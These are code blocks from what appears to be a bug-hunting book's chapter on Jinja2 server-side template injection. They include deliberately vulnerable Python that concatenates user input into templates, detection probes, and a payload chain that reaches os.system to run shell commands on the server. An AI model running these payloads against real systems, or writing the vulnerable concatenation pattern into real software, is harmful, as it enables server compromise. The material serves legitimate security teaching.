["```\n<html> <body>1 <h1>{{ list_title }}</h1> <h2>{{ list_description }}</h2>2 {% for item in item_list %} {{ item }} {% if not loop.last %},{% endif %} {% endfor %} </body>\n</html>\n```", "```\nfrom jinja2 import Template with open('example.jinja') as f: 1 tmpl = Template(f.read()) print(tmpl.render( 2 list_title = 3 \"Chapter Contents\", list_description = 4 \"Here are the contents of chapter 16.\", item_list = 5 [\"Mechanisms Of Template Injection\", \"Preventing Template Injection\", \"Hunting For Template Injection\", \\\n\"Escalating Template Injection\", \"Automating Template Injection\", \"Find Your First Template Injection!\"]\n))\n```", "```\n<html> <body> <h1>Chapter Contents</h1> <h2>Here are the contents of chapter 16.</h2> Mechanisms Of Template Injection, Preventing Template Injection, Hunting For Template Injection, Escalating Template Injection, Automating Template Injection, Find Your First Template Injection! </body>\n</html>\n```", "```\nfrom jinja2 import Template\nwith open('example.jinja') as f: tmpl = Template(f.read())\nprint(tmpl.render( 1 list_title = user_input.title, 2 list_description = user_input.description, 3 item_list = user_input.list,\n))\n```", "```\nfrom jinja2 import Template\ntmpl = Template(\"\n<html><h1>The user's name is: \" + user_input + \"</h1></html>\")1 print(tmpl.render())2\n```", "```\nGET /display_name?name=Vickie\nHost: example.com\n```", "```\n<html> <h1>The user's name is: Vickie</h1>\n</html>\n```", "```\nGET /display_name?name={{1+1}}\nHost: example.com\n```", "```\n<html> <h1>The user's name is: 2</h1>\n</html>\n```", "```\nGET /display_name?name={{'Vickie'.upper()}}\nHost: example.com\n```", "```\n<html> <h1>The user's name is: VICKIE</h1>\n</html>\n```", "```\nGET /display_name?name={{7*7}}\nHost: example.com\n```", "```\nfrom jinja2 import Template\ntmpl = Template(\"\n<html><h1>The user's name is: \" + user_input + \"</h1></html>\")print(tmpl.render())\n```", "```\nfrom jinja2 import Template\ntmpl = Template(\"\n<html><h1>The user's name is: {{\" + user_input + \"}}</h1></html>\")print(tmpl.render())\n```", "```\nGET /display_name?name=7*7\nHost: example.com\n```", "```\njinja2.exceptions.UndefinedError: 'abcxx' is undefined\n```", "```\nfrom jinja2 import Template\ntmpl = Template(\"\n<html><h1>The user's name is: \" + user_input + \"</h1></html>\")print(tmpl.render())\n```", "```\nos.system('ls')\n```", "```\nGET /display_name?name={{os.system('ls')}}\nHost: example.com\n```", "```\njinja2.exceptions.UndefinedError: 'os' is undefined\n```", "```\nGET /display_name?name=\"{{__import__('os').system('ls')}}\"\nHost: example.com\n```", "```\njinja2.exceptions.UndefinedError: '__import__' is undefined\n```", "```\nGET /display_name?name=\"{{[].__class__.__bases__[0].__subclasses__()}}\"\nHost: example.com\n```", "```\n[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>, <class 'function'>...]\n```", "```\n[].__class__.__bases__[0].__subclasses__()\n```", "```\n[].__class__\n```", "```\n[].__class__.__bases__\n```", "```\n[].__class__.__bases__[0]\n```", "```\n[].__class__.__bases__[0].__subclasses__()\n```", "```\n1 {% for x in [].__class__.__bases__[0].__subclasses__() %}2 {% if 'catch_warnings' in x.__name__ %}3 {{x()}}\n{%endif%}\n{%endfor%}\n```", "```\n{% for x in [].__class__.__bases__[0].__subclasses__() %}\n{% if 'catch_warnings' in x.__name__ %}\n{{x()._module.__builtins__}}\n{%endif%}\n{%endfor%}\n```", "```\n{'__name__': 'builtins', '__doc__': \"Built-in functions, exceptions, and other objects.\\n\\nNoteworthy: None is the 'nil' object; Ellipsis represents '...' in slices.\", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>), '__build_class__': <built-in function __build_class__>, **'__import__': <built-in function __import__>,** 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'oct': <built-in function oct>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'classmethod': <class 'classmethod'>, ...}\n```", "```\n{% for x in [].__class__.__bases__[0].__subclasses__() %}\n{% if 'catch_warnings' in x.__name__ %}\n{{x()._module.__builtins__**['__import__']**}}\n{%endif%}\n{%endfor%}\n```", "```\n{% for x in [].__class__.__bases__[0].__subclasses__() %}\n{% if 'catch_warnings' in x.__name__ %}\n{{x()._module.__builtins__['__import__']**('os')**}}\n{%endif%}\n{%endfor%}\n```", "```\n{% for x in [].__class__.__bases__[0].__subclasses__() %}\n{% if 'catch_warnings' in x.__name__ %}\n{{x()._module.__builtins__['__import__']('os').system**('ls')**}}\n{%endif%}\n{%endfor%}\n```", "```\n{% for x in [].__class__.__bases__[0].__subclasses__() %}\n{% if 'warning' in x.__name__ %}\n{{x()._module.__builtins__['__import__']('os').system('touch template_injection_by_vickie.txt')}}\n{%endif%}\n{%endfor%}\n```"]